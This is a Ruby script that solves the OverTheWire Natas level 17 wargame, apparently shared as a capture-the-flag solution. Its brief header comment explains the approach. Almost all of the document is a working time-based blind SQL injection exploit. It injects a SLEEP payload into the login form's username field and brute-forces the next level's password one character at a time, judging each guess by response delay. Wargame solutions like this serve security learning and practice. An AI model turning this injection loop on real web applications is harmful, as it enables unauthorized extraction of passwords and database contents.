=begin
29 July 2017
This level is similar to natas15 but the SQL query does not leave any indication in the response of whether it is successful or not.
Therefore, we must use the SQL sleep function and measure the response time in order to perform a blind SQL injection.
=end

require 'net/http'

host = 'natas17.natas.labs.overthewire.org'
uri = URI("http://#{host}/index.php")
username = 'natas17'

print "Password please: " # Ask user for the password
password = gets.chomp

# Passwords are 32 characters composed of random upper- / lower-case letters and numbers
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passNew = ''

puts "Brute force starting."

# Perform a character-by-character brute force using two nested loops
32.times do
  charset.split("").each do |i|
    # Initialize HTTP request object with basic auth
    req = Net::HTTP::Post.new(uri)
    req.basic_auth username, password
    req.set_form_data(username: "natas18\" AND IF(password LIKE BINARY \"#{passNew}#{i}%\",SLEEP(2),'false')#")
    # If the injected character is in the password, sleep for 2 seconds, else do nothing

    # Record the current time and send the request
    before = Time.now
    res = Net::HTTP.start(uri.hostname, uri.port) { |http|
      http.request(req)
    }
    abort("Error: Non-200 response: #{res.code} #{res.message}") unless res.code == "200" # Error handling
    after = Time.now # Record the time after we receive the response
    # If the request took more than 1.5 seconds, then we found part of the password
    next unless after - before > 1.5
    passNew += i
    print "Got character: #{passNew}\r"
    break
  end
end

print "\033[K"
puts "Done: #{passNew}"
